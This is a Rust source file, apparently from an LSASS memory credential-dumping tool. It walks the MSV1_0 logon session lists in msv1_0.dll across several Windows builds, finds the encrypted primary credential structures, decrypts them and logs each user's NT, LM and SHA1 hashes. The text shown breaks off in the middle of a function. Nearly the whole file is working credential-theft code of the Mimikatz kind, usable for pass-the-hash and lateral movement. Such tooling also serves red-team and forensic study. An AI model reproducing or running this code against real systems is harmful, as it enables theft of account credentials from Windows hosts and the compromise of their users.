use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::MsvCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// MSV1_0 list entry offsets (Windows 10 x64).
/// These offsets are within the MSV1_0_LIST_ENTRY structure.
struct MsvOffsets {
    flink: u64,
    luid: u64,
    username: u64,
    domain: u64,
    credentials_ptr: u64,
}

/// Session metadata discovered during MSV list walk (returned even when creds are paged).
pub struct MsvSessionInfo {
    pub luid: u64,
    pub username: String,
    pub domain: String,
    pub logon_type: u32,
    pub session_id: u32,
    pub logon_time: u64,
    pub logon_server: String,
    pub sid: String,
}

// Multiple MSV1_0_LIST variants to try (depends on exact Windows 10 build).
// Offsets differ significantly between builds.
// credentials_ptr = 0 means "auto-detect by scanning for Primary signature".
const MSV_OFFSET_VARIANTS: &[MsvOffsets] = &[
    // Variant 0: Empirical NlpActiveLogonTable (Win10 19041+/22H2)
    MsvOffsets { flink: 0x00, luid: 0x2C, username: 0x48, domain: 0x58, credentials_ptr: 0 },
    // Variant 1: MSV1_0_LIST_63 base (Win10 1507-1511)
    MsvOffsets { flink: 0x00, luid: 0x70, username: 0x80, domain: 0x90, credentials_ptr: 0xE8 },
    // Variant 2: MSV1_0_LIST_63 extended (Win10 1607+)
    MsvOffsets { flink: 0x00, luid: 0x90, username: 0xA8, domain: 0xB8, credentials_ptr: 0x108 },
    // Variant 3: MSV1_0_LIST_62 (Win8/8.1 / Server 2012/2012R2)
    MsvOffsets { flink: 0x00, luid: 0x70, username: 0x90, domain: 0xA0, credentials_ptr: 0xF8 },
    // Variant 4: MSV1_0_LIST_61 (Win7 / Server 2008 R2)
    MsvOffsets { flink: 0x00, luid: 0x30, username: 0x40, domain: 0x50, credentials_ptr: 0xA0 },
];

/// Primary credential offsets within MSV1_0_PRIMARY_CREDENTIAL.
struct PrimaryCredOffsets {
    lm_hash: u64,
    nt_hash: u64,
    sha1_hash: u64,
}

// MSV1_0_PRIMARY_CREDENTIAL offsets (decrypted blob).
// Multiple offset sets for different Windows builds:
const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
    // Variant 0: Windows 10 22H2 (build 19045) - empirically verified
    PrimaryCredOffsets { nt_hash: 0x4A, lm_hash: 0x5A, sha1_hash: 0x6A },
    // Variant 1: Win10 1607+ (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_1607)
    PrimaryCredOffsets { nt_hash: 0x4C, lm_hash: 0x5C, sha1_hash: 0x6C },
    // Variant 2: Win10 1607+ larger DPAPIProtected alignment
    PrimaryCredOffsets { nt_hash: 0x50, lm_hash: 0x60, sha1_hash: 0x70 },
    // Variant 3: Win10 1507/1511 (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_OLD)
    // isIso(1)+isNtOwf(1)+isLmOwf(1)+isSha(1)+align(4) = 8 bytes at +0x20 → hashes at +0x28
    PrimaryCredOffsets { nt_hash: 0x28, lm_hash: 0x38, sha1_hash: 0x48 },
    // Variant 4: Win7 SP1 / Win8 / Win8.1 / Server 2008R2-2012R2
    // No isIso, no DPAPIProtected. Hashes directly after UserName.
    PrimaryCredOffsets { nt_hash: 0x20, lm_hash: 0x30, sha1_hash: 0x40 },
];

/// Extract MSV1_0 sessions (always) and credentials (when available) from msv1_0.dll.
/// Returns sessions even when credentials are paged out.
pub fn extract_msv_sessions(
    vmem: &impl VirtualMemory,
    msv_base: u64,
    msv_size: u32,
) -> Vec<MsvSessionInfo> {
    let pe = match PeHeaders::parse_from_memory(vmem, msv_base) {
        Ok(p) => p,
        Err(_) => return Vec::new(),
    };

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Vec::new(),
    };
    let text_base = msv_base + text.virtual_address as u64;

    // Find LogonSessionList (hash table) via pattern or data scan.
    // The pattern resolves both the list base address and the bucket count.
    let (list_base, bucket_count) = match patterns::find_pattern(
        vmem, text_base, text.virtual_size,
        patterns::MSV_LOGON_SESSION_PATTERNS, "msv_LogonSessionList_sessions",
    ) {
        Ok((pattern_addr, _)) => match find_list_addr_and_count(vmem, pattern_addr) {
            Ok((addr, count)) => (Some(addr), count),
            Err(_) => (None, 0),
        },
        Err(_) => (None, 0),
    };

    let _ = msv_size; // Used in full credential extraction

    // Use HashMap to allow metadata enrichment when a session is re-discovered
    // by a variant with richer metadata (e.g. variant 2 has logon_time, variant 0 doesn't).
    let mut session_map: std::collections::HashMap<u64, MsvSessionInfo> = std::collections::HashMap::new();

    // Walk all buckets of the pattern-resolved hash table
    if let Some(base) = list_base {
        log::info!("MSV session discovery: list=0x{:x} buckets={}", base, bucket_count);
        for offsets in MSV_OFFSET_VARIANTS {
            let pre = session_map.len();
            walk_session_buckets(vmem, base, bucket_count, offsets, &mut session_map);
            if session_map.len() > pre {
                log::info!("MSV sessions: variant luid=0x{:x} found {} sessions across {} buckets",
                    offsets.luid, session_map.len() - pre, bucket_count);
                break;
            }
        }
    }

    // Also try .data scan candidates (single list heads) if pattern didn't find enough
    if session_map.len() < 3 {
        let list_addrs = find_all_logon_session_list_candidates(vmem, &pe, msv_base).unwrap_or_default();

        for list_addr in &list_addrs {
            for offsets in MSV_OFFSET_VARIANTS {
                let pre = session_map.len();
                walk_session_list(vmem, *list_addr, offsets, &mut session_map);
                if session_map.len() > pre {
                    break;
                }
            }
        }
    }

    // Always try ALL hash tables with ALL variants to enrich session metadata.
    // Different tables hold different entries with different variants, and variants
    // with higher offsets (e.g. luid=0x90) provide richer metadata (logon_time, SID).
    {
        let pre_count = session_map.len();
        if let Ok(tables) = find_inline_hash_table(vmem, &pe, msv_base) {
            for (table_addr, bucket_count) in &tables {
                for offsets in MSV_OFFSET_VARIANTS {
                    walk_session_buckets(vmem, *table_addr, *bucket_count, offsets, &mut session_map);
                }
            }
        }
        if session_map.len() > pre_count {
            log::info!("Hash table walk found {} additional sessions", session_map.len() - pre_count);
        }
    }

    session_map.into_values().collect()
}

/// Walk a hash table (array of LIST_ENTRY buckets) and insert/merge sessions.
fn walk_session_buckets(
    vmem: &impl VirtualMemory,
    base: u64,
    bucket_count: usize,
    offsets: &MsvOffsets,
    session_map: &mut std::collections::HashMap<u64, MsvSessionInfo>,
) {
    for bucket_idx in 0..bucket_count {
        let bucket_addr = base + (bucket_idx as u64) * 16;
        let head_flink = match vmem.read_virt_u64(bucket_addr) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if head_flink == 0 || head_flink == bucket_addr {
            continue;
        }

        let mut current = head_flink;
        let mut visited = std::collections::HashSet::new();

        for _ in 0..256 {
            if current == bucket_addr || visited.contains(&current) || current == 0 {
                break;
            }
            visited.insert(current);

            let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
            let username = vmem.read_win_unicode_string(current + offsets.username).unwrap_or_default();
            let domain = vmem.read_win_unicode_string(current + offsets.domain).unwrap_or_default();

            if !username.is_empty() && luid != 0 {
                let (logon_type, session_id, logon_time, logon_server, sid) =
                    extract_session_metadata(vmem, current, offsets);
                let info = MsvSessionInfo {
                    luid, username, domain, logon_type, session_id,
                    logon_time, logon_server, sid,
                };
                merge_session(session_map, info);
            }

            current = match vmem.read_virt_u64(current + offsets.flink) {
                Ok(f) => f,
                Err(_) => break,
            };
        }
    }
}

/// Walk a single linked list and insert/merge sessions.
fn walk_session_list(
    vmem: &impl VirtualMemory,
    list_addr: u64,
    offsets: &MsvOffsets,
    session_map: &mut std::collections::HashMap<u64, MsvSessionInfo>,
) {
    let head_flink = match vmem.read_virt_u64(list_addr) {
        Ok(f) => f,
        Err(_) => return,
    };
    if head_flink == 0 || head_flink == list_addr {
        return;
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    for _ in 0..256 {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
        let username = vmem.read_win_unicode_string(current + offsets.username).unwrap_or_default();
        let domain = vmem.read_win_unicode_string(current + offsets.domain).unwrap_or_default();

        if !username.is_empty() && luid != 0 {
            let (logon_type, session_id, logon_time, logon_server, sid) =
                extract_session_metadata(vmem, current, offsets);
            let info = MsvSessionInfo {
                luid, username, domain, logon_type, session_id,
                logon_time, logon_server, sid,
            };
            merge_session(session_map, info);
        }

        current = match vmem.read_virt_u64(current + offsets.flink) {
            Ok(f) => f,
            Err(_) => break,
        };
    }
}

/// Insert or merge a session into the map. When re-discovering a LUID,
/// enrich with richer metadata (prefer non-zero logon_time, non-empty SID, etc.).
fn merge_session(
    map: &mut std::collections::HashMap<u64, MsvSessionInfo>,
    new: MsvSessionInfo,
) {
    match map.entry(new.luid) {
        std::collections::hash_map::Entry::Vacant(e) => { e.insert(new); },
        std::collections::hash_map::Entry::Occupied(mut e) => {
            let existing = e.get_mut();
            // Enrich: prefer non-zero/non-empty values from the new variant
            if existing.logon_time == 0 && new.logon_time != 0 {
                existing.logon_time = new.logon_time;
            }
            if existing.logon_type == 0 && new.logon_type != 0 {
                existing.logon_type = new.logon_type;
            }
            if existing.session_id == 0 && new.session_id != 0 {
                existing.session_id = new.session_id;
            }
            if existing.sid.is_empty() && !new.sid.is_empty() {
                existing.sid = new.sid;
            }
            if existing.logon_server.is_empty() && !new.logon_server.is_empty() {
                existing.logon_server = new.logon_server;
            }
        }
    }
}

/// Extract session metadata from an MSV list entry.
fn extract_session_metadata(
    vmem: &impl VirtualMemory,
    entry_addr: u64,
    offsets: &MsvOffsets,
) -> (u32, u32, u64, String, String) {
    let logon_type: u32;
    let session_id: u32;
    let logon_time: u64;
    let logon_server: String;
    let sid: String;

    if offsets.luid == 0x2C {
        // NlpActiveLogon layout (Win10 19041+/22H2):
        //   +0x00: Flink/Blink (16B)
        //   +0x2C: LUID (8B), +0x34: LogonType (4B), +0x38: field2 (4B)
        //   +0x48: Username (UNICODE_STRING 16B), +0x58: Domain, +0x68: LogonServer
        //   +0x88: SID embedded (not pointer)
        // LogonTime not available in this structure variant.
        logon_type = vmem.read_virt_u32(entry_addr + 0x34).unwrap_or(0);
        session_id = vmem.read_virt_u32(entry_addr + 0x38).unwrap_or(0);
        logon_time = 0; // Not stored in NlpActiveLogon
        logon_server = vmem.read_win_unicode_string(entry_addr + 0x68).unwrap_or_default();
        sid = read_sid_embedded(vmem, entry_addr + 0x88);
    } else if offsets.luid == 0x90 {
        // MSV1_0_LIST_63 extended (Win10 1607+)
        logon_type = vmem.read_virt_u32(entry_addr + 0x80).unwrap_or(0);
        session_id = vmem.read_virt_u32(entry_addr + 0x84).unwrap_or(0);
        logon_time = vmem.read_virt_u64(entry_addr + 0x88).unwrap_or(0);
        logon_server = vmem.read_win_unicode_string(entry_addr + 0xC8).unwrap_or_default();
        sid = read_sid_string(vmem, entry_addr + 0x98);
    } else if offsets.luid == 0x70 {
        // MSV1_0_LIST_63 base / MSV1_0_LIST_62
        logon_type = vmem.read_virt_u32(entry_addr + 0x60).unwrap_or(0);
        session_id = vmem.read_virt_u32(entry_addr + 0x64).unwrap_or(0);
        logon_time = vmem.read_virt_u64(entry_addr + 0x68).unwrap_or(0);
        logon_server = vmem.read_win_unicode_string(entry_addr + 0xA8).unwrap_or_default();
        sid = read_sid_string(vmem, entry_addr + 0x78);
    } else {
        // Win7 or unknown - minimal metadata
        logon_type = 0;
        session_id = 0;
        logon_time = 0;
        logon_server = String::new();
        sid = String::new();
    }

    (logon_type, session_id, logon_time, logon_server, sid)
}

/// Read a SID from a pointer and format as "S-1-5-21-..."
fn read_sid_string(vmem: &impl VirtualMemory, ptr_addr: u64) -> String {
    let sid_ptr = match vmem.read_virt_u64(ptr_addr) {
        Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
        _ => return String::new(),
    };
    // SID structure: Revision(1) + SubAuthorityCount(1) + IdentifierAuthority(6) + SubAuthority(4*count)
    let header = match vmem.read_virt_bytes(sid_ptr, 8) {
        Ok(h) => h,
        Err(_) => return String::new(),
    };
    let revision = header[0];
    let sub_count = header[1] as usize;
    if revision != 1 || sub_count == 0 || sub_count > 15 {
        return String::new();
    }
    let authority = u64::from_be_bytes([0, 0, header[2], header[3], header[4], header[5], header[6], header[7]]);
    let sub_data = match vmem.read_virt_bytes(sid_ptr + 8, sub_count * 4) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    let mut s = format!("S-{}-{}", revision, authority);
    for i in 0..sub_count {
        let sub = u32::from_le_bytes([sub_data[i*4], sub_data[i*4+1], sub_data[i*4+2], sub_data[i*4+3]]);
        s.push_str(&format!("-{}", sub));
    }
    s
}

/// Read a SID embedded directly in a structure (not via pointer).
fn read_sid_embedded(vmem: &impl VirtualMemory, sid_addr: u64) -> String {
    let header = match vmem.read_virt_bytes(sid_addr, 8) {
        Ok(h) => h,
        Err(_) => return String::new(),
    };
    let revision = header[0];
    let sub_count = header[1] as usize;
    if revision != 1 || sub_count == 0 || sub_count > 15 {
        return String::new();
    }
    let authority = u64::from_be_bytes([0, 0, header[2], header[3], header[4], header[5], header[6], header[7]]);
    let sub_data = match vmem.read_virt_bytes(sid_addr + 8, sub_count * 4) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    let mut s = format!("S-{}-{}", revision, authority);
    for i in 0..sub_count {
        let sub = u32::from_le_bytes([sub_data[i*4], sub_data[i*4+1], sub_data[i*4+2], sub_data[i*4+3]]);
        s.push_str(&format!("-{}", sub));
    }
    s
}

/// Extract MSV1_0 credentials (NTLM hashes) from msv1_0.dll.
pub fn extract_msv_credentials(
    vmem: &impl VirtualMemory,
    msv_base: u64,
    _msv_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, MsvCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;
    let mut results = Vec::new();

    // Find .text section
    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => {
            log::info!("No .text section in msv1_0.dll, scanning full image");
            return Ok(results);
        }
    };

    let text_base = msv_base + text.virtual_address as u64;
    log::info!(
        "MSV PE: base=0x{:x}, .text VA=0x{:x}, size=0x{:x}",
        msv_base, text.virtual_address, text.virtual_size
    );

    // Pattern scan for LogonSessionList
    let list_addrs = match patterns::find_pattern(
        vmem,
        text_base,
        text.virtual_size,
        patterns::MSV_LOGON_SESSION_PATTERNS,
        "msv_LogonSessionList",
    ) {
        Ok((pattern_addr, _)) => {
            vec![find_list_addr(vmem, pattern_addr)?]
        }
        Err(e) => {
            log::info!("Code pattern scan failed (likely paged out): {}", e);
            // Fallback: scan .data section for ALL topology-valid LIST_ENTRY heads
            find_all_logon_session_list_candidates(vmem, &pe, msv_base)?
        }
    };

    if list_addrs.is_empty() {
        return Err(crate::error::GovmemError::PatternNotFound(
            "LogonSessionList in msv1_0.dll".to_string(),
        ));
    }

    // Auto-detect the correct (list, offset variant) by trying each combination
    for (li, list_addr) in list_addrs.iter().enumerate() {
        let head_flink = match vmem.read_virt_u64(*list_addr) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if head_flink == 0 || head_flink == *list_addr {
            continue;
        }

        for (vi, offsets) in MSV_OFFSET_VARIANTS.iter().enumerate() {
            // Try reading username from the first few entries with this variant
            let mut current = head_flink;
            let mut visited = std::collections::HashSet::new();
            let mut found_username = false;

            for _ in 0..10 {
                if current == *list_addr || visited.contains(&current) || current == 0 {
                    break;
                }
                visited.insert(current);

                let username = vmem
                    .read_win_unicode_string(current + offsets.username)
                    .unwrap_or_default();
                if !username.is_empty() {
                    found_username = true;
                    break;
                }

                current = match vmem.read_virt_u64(current + offsets.flink) {
                    Ok(f) => f,
                    Err(_) => break,
                };
            }

            if found_username {
                log::info!(
                    "MSV: Using list candidate {} at 0x{:x} with offset variant {} (LUID=0x{:x}, user=0x{:x}, cred=0x{:x})",
                    li, list_addr, vi, offsets.luid, offsets.username, offsets.credentials_ptr
                );
                results = walk_msv_list(vmem, *list_addr, offsets, keys);
                if !results.is_empty() {
                    return Ok(results);
                }
            }
        }
    }

    // Fallback 2: Search for inline hash table (array of LIST_ENTRY in .data)
    log::info!("MSV: Trying inline hash table scan...");
    if let Ok(tables) = find_inline_hash_table(vmem, &pe, msv_base) {
        for (table_addr, bucket_count) in &tables {
            for offsets in MSV_OFFSET_VARIANTS {
                if offsets.credentials_ptr == 0 {
                    continue; // Skip empirical NlpActiveLogon variant for hash table
                }
                let r = walk_hash_table(vmem, *table_addr, *bucket_count, offsets, keys);
                if !r.is_empty() {
                    return Ok(r);
                }
            }
            // Also try hash table with auto-detect credentials
            for offsets in MSV_OFFSET_VARIANTS {
                let r = walk_hash_table(vmem, *table_addr, *bucket_count, offsets, keys);
                if !r.is_empty() {
                    return Ok(r);
                }
            }
        }
    }

    // Fallback 3: try walking each candidate list with each variant
    for list_addr in &list_addrs {
        let head_flink = match vmem.read_virt_u64(*list_addr) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if head_flink == 0 || head_flink == *list_addr {
            continue;
        }
        for offsets in MSV_OFFSET_VARIANTS {
            let r = walk_msv_list(vmem, *list_addr, offsets, keys);
            if !r.is_empty() {
                return Ok(r);
            }
        }
    }

    Ok(results)
}

fn walk_msv_list(
    vmem: &impl VirtualMemory,
    list_addr: u64,
    offsets: &MsvOffsets,
    keys: &CryptoKeys,
) -> Vec<(u64, MsvCredential)> {
    let mut results = Vec::new();
    let head_flink = match vmem.read_virt_u64(list_addr) {
        Ok(f) => f,
        Err(_) => return results,
    };
    if head_flink == 0 || head_flink == list_addr {
        return results;
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = match vmem.read_virt_u64(current + offsets.luid) {
            Ok(l) => l,
            Err(_) => break,
        };

        let username = vmem
            .read_win_unicode_string(current + offsets.username)
            .unwrap_or_default();
        let domain = vmem
            .read_win_unicode_string(current + offsets.domain)
            .unwrap_or_default();

        // Get credentials pointer: either from known offset or auto-detect
        let cred_ptr = if offsets.credentials_ptr > 0 {
            let ptr = vmem.read_virt_u64(current + offsets.credentials_ptr).unwrap_or(0);
            if ptr != 0 && is_heap_ptr(ptr) {
                // Verify it's actually a KIWI_MSV1_0_PRIMARY_CREDENTIALS
                if is_primary_credentials_struct(vmem, ptr) {
                    Some(ptr)
                } else {
                    log::debug!("  cred_ptr at +0x{:x} = 0x{:x} is not Primary credentials, trying scan", offsets.credentials_ptr, ptr);
                    find_credentials_ptr_in_entry(vmem, current)
                }
            } else {
                find_credentials_ptr_in_entry(vmem, current)
            }
        } else {
            // Auto-detect mode: scan entry for KIWI_MSV1_0_PRIMARY_CREDENTIALS
            find_credentials_ptr_in_entry(vmem, current)
        };

        if let Some(cred_ptr) = cred_ptr {
            if !username.is_empty() {
                if let Ok(cred) = extract_primary_credential(vmem, cred_ptr, keys) {
                    log::info!(
                        "MSV credential: LUID=0x{:x} user={} domain={} NT={}",
                        luid, username, domain, hex::encode(cred.nt_hash)
                    );
                    results.push((
                        luid,
                        MsvCredential {
                            username: username.clone(),
                            domain: domain.clone(),
                            lm_hash: cred.lm_hash,
                            nt_hash: cred.nt_hash,
                            sha1_hash: cred.sha1_hash,
                        },
                    ));
                }
            }
        } else if !username.is_empty() {
            log::info!(
                "MSV entry (credentials paged out): LUID=0x{:x} user={} domain={}",
                luid, username, domain
            );
        }

        current = match vmem.read_virt_u64(current + offsets.flink) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    results
}

/// Scan an entry's memory for a pointer to KIWI_MSV1_0_PRIMARY_CREDENTIALS.
/// Identified by the "Primary" ANSI_STRING at offset +0x08 in the target structure.
fn find_credentials_ptr_in_entry(
    vmem: &impl VirtualMemory,
    entry_addr: u64,
) -> Option<u64> {
    // Scan 8-byte aligned offsets for heap pointers
    // Start at 0x80 (past known UNICODE_STRING fields) up to 0x220
    let mut heap_ptrs_found = 0;
    for off in (0x80..0x220usize).step_by(8) {
        let ptr = match vmem.read_virt_u64(entry_addr + off as u64) {
            Ok(p) => p,
            Err(_) => continue,
        };
        if !is_heap_ptr(ptr) {
            continue;
        }
        heap_ptrs_found += 1;
        // Direct check: does this point to KIWI_MSV1_0_PRIMARY_CREDENTIALS?
        if is_primary_credentials_struct(vmem, ptr) {
            log::info!(
                "  Auto-detected pCredentials at entry+0x{:x} -> 0x{:x}",
                off, ptr
            );
            return Some(ptr);
        }
    }
    // Second pass: try one level of indirection (entry -> intermediate -> Primary)
    for off in (0x80..0x220usize).step_by(8) {
        let ptr = match vmem.read_virt_u64(entry_addr + off as u64) {
            Ok(p) => p,
            Err(_) => continue,
        };
        if !is_heap_ptr(ptr) {
            continue;
        }
        // Check first few pointer-sized fields in the target struct
        for inner_off in (0..0x40usize).step_by(8) {
            let inner_ptr = match vmem.read_virt_u64(ptr + inner_off as u64) {
                Ok(p) => p,
                Err(_) => continue,
            };
            if !is_heap_ptr(inner_ptr) {
                continue;
            }
            if is_primary_credentials_struct(vmem, inner_ptr) {
                log::info!(
                    "  Auto-detected pCredentials (indirect) at entry+0x{:x} -> 0x{:x} +0x{:x} -> 0x{:x}",
                    off, ptr, inner_off, inner_ptr
                );
                return Some(inner_ptr);
            }
        }
    }
    log::debug!(
        "  No Primary credentials found in entry 0x{:x} ({} heap ptrs scanned)",
        entry_addr, heap_ptrs_found
    );
    None
}

/// Check if a pointer leads to a KIWI_MSV1_0_PRIMARY_CREDENTIALS structure.
/// Layout:
///   +0x00: next (PVOID)
///   +0x08: Primary (ANSI_STRING: Length u16 + MaxLength u16 + pad u32 + Buffer PVOID)
///   +0x18: Credentials (UNICODE_STRING: encrypted data)
fn is_primary_credentials_struct(vmem: &impl VirtualMemory, ptr: u64) -> bool {
    // Check ANSI_STRING at +0x08: Length should be 7 ("Primary"), MaxLength >= 7
    let length = match vmem.read_virt_u16(ptr + 0x08) {
        Ok(l) => l,
        Err(_) => return false,
    };
    let max_length = match vmem.read_virt_u16(ptr + 0x0A) {
        Ok(l) => l,
        Err(_) => return false,
    };
    if length != 7 || !(7..=64).contains(&max_length) {
        return false;
    }
    // Read the buffer pointer
    let buf_ptr = match vmem.read_virt_u64(ptr + 0x10) {
        Ok(p) => p,
        Err(_) => return false,
    };
    if buf_ptr == 0 || buf_ptr < 0x10000 {
        return false;
    }
    // Try to verify "Primary" string (may fail if paged out)
    let string_ok = match vmem.read_virt_bytes(buf_ptr, 7) {
        Ok(data) => data == b"Primary",
        Err(_) => false,
    };
    if string_ok {
        return true;
    }
    // Fallback: check structural properties even if "Primary" string is paged out
    // The Credentials UNICODE_STRING at +0x18 should have valid Length
    let cred_len = match vmem.read_virt_u16(ptr + 0x18) {
        Ok(l) => l as usize,
        Err(_) => return false,
    };
    let cred_max_len = match vmem.read_virt_u16(ptr + 0x1A) {
        Ok(l) => l as usize,
        Err(_) => return false,
    };
    let cred_buf = match vmem.read_virt_u64(ptr + 0x20) {
        Ok(p) => p,
        Err(_) => return false,
    };
    // Encrypted credentials: valid length (non-zero, <= 0x200, must be even for UNICODE_STRING)
    // Buffer must be a valid heap pointer
    if cred_len == 0 || cred_len > 0x200 || cred_max_len < cred_len {
        return false;
    }
    if !is_heap_ptr(cred_buf) {
        return false;
    }
    // Additional check: next pointer at +0x00 should be either 0 or a heap ptr
    let next = vmem.read_virt_u64(ptr).unwrap_or(1);
    if next != 0 && !is_heap_ptr(next) {
        return false;
    }
    log::debug!(
        "  Structural match for Primary credentials at 0x{:x}: ANSI(len={},max={}), UNICODE(len={},max={},buf=0x{:x})",
        ptr, length, max_length, cred_len, cred_max_len, cred_buf
    );
    true
}

/// Scan the .data section of msv1_0.dll for ALL topology-valid LIST_ENTRY heads.
fn find_all_logon_session_list_candidates(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    msv_base: u64,
) -> Result<Vec<u64>> {
    let data_sec = pe
        .find_section(".data")
        .ok_or_else(|| crate::error::GovmemError::PatternNotFound(
            ".data section in msv1_0.dll".to_string(),
        ))?;

    let data_base = msv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    log::info!(
        "Scanning msv1_0.dll .data for LIST_ENTRY heads: base=0x{:x} size=0x{:x}",
        data_base, data_size
    );

    let mut candidates = Vec::new();

    for off in (0..data_size.saturating_sub(16)).step_by(8) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());

        if !is_heap_ptr(flink) || !is_heap_ptr(blink) {
            continue;
        }
        if flink >= msv_base && flink < msv_base + 0x100000 {
            continue;
        }

        let list_addr = data_base + off as u64;
        let entry_addr = flink;

        let entry_flink = match vmem.read_virt_u64(entry_addr) {
            Ok(f) => f,
            Err(_) => continue,
        };
        let entry_blink = match vmem.read_virt_u64(entry_addr + 0x08) {
            Ok(b) => b,
            Err(_) => continue,
        };
        if entry_blink != list_addr {
            continue;
        }
        if entry_flink != list_addr && !is_heap_ptr(entry_flink) {
            continue;
        }

        log::debug!(
            "MSV data scan topology-valid candidate at 0x{:x} (data+0x{:x}): flink=0x{:x} entry_flink=0x{:x}",
            list_addr, off, flink, entry_flink
        );
        candidates.push(list_addr);
    }

    log::info!("MSV data scan: {} topology-valid candidates", candidates.len());
    Ok(candidates)
}

/// Search the .data section for an inline LogonSessionList hash table.
/// The hash table is an array of LIST_ENTRY (16 bytes each) where:
///   - Empty buckets have Flink=Blink=&self (self-referencing .data address)
///   - Non-empty buckets have Flink pointing to first MSV1_0_LIST entry (heap)
///     Returns: list of (bucket_addr, bucket_count) for potential hash tables found.
fn find_inline_hash_table(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    msv_base: u64,
) -> Result<Vec<(u64, usize)>> {
    let msv_end = msv_base + 0x100000; // Upper bound of DLL image
    let data_sec = pe
        .find_section(".data")
        .ok_or_else(|| crate::error::GovmemError::PatternNotFound(
            ".data section in msv1_0.dll".to_string(),
        ))?;

    let data_base = msv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    let mut tables = Vec::new();
    let mut run_start: Option<usize> = None;
    let mut run_count = 0usize;

    // Scan for consecutive 16-byte LIST_ENTRY entries that form a valid hash table
    for off in (0..data_size.saturating_sub(16)).step_by(16) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());
        let self_addr = data_base + off as u64;

        // A valid hash table bucket has:
        // - Flink/Blink self-referencing (empty bucket), OR
        // - Flink/Blink pointing to HEAP entries (not within the DLL image itself)
        let flink_is_self = flink == self_addr;
        let blink_is_self = blink == self_addr;
        let flink_is_dll = flink >= msv_base && flink < msv_end;
        let blink_is_dll = blink >= msv_base && blink < msv_end && !blink_is_self;

        let is_valid_bucket = (flink_is_self && blink_is_self) // Empty bucket
            || (is_heap_ptr(flink) && !flink_is_dll && (blink_is_self || (is_heap_ptr(blink) && !blink_is_dll))); // Non-empty bucket

        if is_valid_bucket {
            if run_start.is_none() {
                run_start = Some(off);
            }
            run_count += 1;
        } else {
            if let Some(start) = run_start.filter(|_| run_count >= 5) {
                let table_addr = data_base + start as u64;
                log::info!(
                    "Found inline hash table at 0x{:x} (data+0x{:x}): {} buckets",
                    table_addr, start, run_count
                );
                tables.push((table_addr, run_count));
            }
            run_start = None;
            run_count = 0;
        }
    }
    // Check final run
    if let Some(start) = run_start.filter(|_| run_count >= 5) {
        let table_addr = data_base + start as u64;
        log::info!(
            "Found inline hash table at 0x{:x} (data+0x{:x}): {} buckets",
            table_addr, start, run_count
        );
        tables.push((table_addr, run_count));
    }

    Ok(tables)
}

/// Walk all buckets in a hash table and extract MSV credentials from MSV1_0_LIST entries.
fn walk_hash_table(
    vmem: &impl VirtualMemory,
    table_addr: u64,
    bucket_count: usize,
    offsets: &MsvOffsets,
    keys: &CryptoKeys,
) -> Vec<(u64, MsvCredential)> {
    let mut results = Vec::new();
    let mut non_empty = 0;

    for bucket_idx in 0..bucket_count {
        let bucket_addr = table_addr + (bucket_idx as u64) * 16;
        let flink = match vmem.read_virt_u64(bucket_addr) {
            Ok(f) => f,
            Err(_) => continue,
        };

        // Skip empty buckets (self-referencing)
        if flink == bucket_addr || flink == 0 {
            continue;
        }
        non_empty += 1;
        log::debug!(
            "Hash table 0x{:x} bucket {}: flink=0x{:x} (non-empty)",
            table_addr, bucket_idx, flink
        );

        // Walk the chain for this bucket
        let mut current = flink;
        let mut visited = std::collections::HashSet::new();

        loop {
            if current == bucket_addr || visited.contains(&current) || current == 0 {
                break;
            }
            visited.insert(current);

            let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
            let username = vmem
                .read_win_unicode_string(current + offsets.username)
                .unwrap_or_default();
            let domain = vmem
                .read_win_unicode_string(current + offsets.domain)
                .unwrap_or_default();

            // Get credentials pointer (known offset or auto-detect)
            let cred_ptr = if offsets.credentials_ptr > 0 {
                let ptr = vmem.read_virt_u64(current + offsets.credentials_ptr).unwrap_or(0);
                if ptr != 0 && is_heap_ptr(ptr) && is_primary_credentials_struct(vmem, ptr) {
                    Some(ptr)
                } else {
                    find_credentials_ptr_in_entry(vmem, current)
                }
            } else {
                find_credentials_ptr_in_entry(vmem, current)
            };

            if let Some(cred_ptr) = cred_ptr {
                if !username.is_empty() {
                    if let Ok(cred) = extract_primary_credential(vmem, cred_ptr, keys) {
                        log::info!(
                            "MSV credential (hash table bucket {}): LUID=0x{:x} user={} domain={} NT={}",
                            bucket_idx, luid, username, domain, hex::encode(cred.nt_hash)
                        );
                        results.push((
                            luid,
                            MsvCredential {
                                username: username.clone(),
